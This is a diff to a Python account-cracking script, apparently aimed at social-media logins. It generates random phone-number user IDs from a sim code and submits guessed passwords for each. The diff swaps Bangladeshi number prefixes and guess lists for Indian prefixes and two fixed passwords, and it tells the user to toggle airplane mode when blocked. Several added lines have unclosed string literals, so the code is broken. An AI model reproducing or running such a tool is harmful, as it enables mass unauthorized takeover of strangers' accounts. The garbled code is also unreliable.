@@ -332,10 +332,10 @@ def virus3():
 	user=[]
 	os.system('clear')
 	print(logo)
-	print(" Sim code Example : 016, 017, 018, 019")
+	print(" Sim code Exampl: 9193 , 9178 , 9190 , 9130 )
 	kode = input(' [💀] Enter sim code: ')
-	doamin = ' BD Number id cloner [APK] '
-	limit = int(input('[?] How many numbers do you want to add : '))
+	doamin = ' Indian id
+	limit = int(input('[?]  limit 5000 , 10000 etc  : '))
 	for nmbr in range(limit):
 		koda = ''.join(random.choice(string.digits) for _ in range(2))
 		kodb = ''.join(random.choice(string.digits) for _ in range(2))
@@ -353,8 +353,8 @@ def virus3():
 		print(' [😳]  use airplane mode if ok ids not come ')
 		print(50*'_')
 		for guru in user:
-			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','i hate you','i have you','বাংলাদেশ']
+			uid = koda+kodb+guru
+			pwx = [ '57273200','59039200']
 			yaari.submit(c,uid,pwx,tl)
 	print(50*'_')
 	print(' [😳] Crack process has been completed')
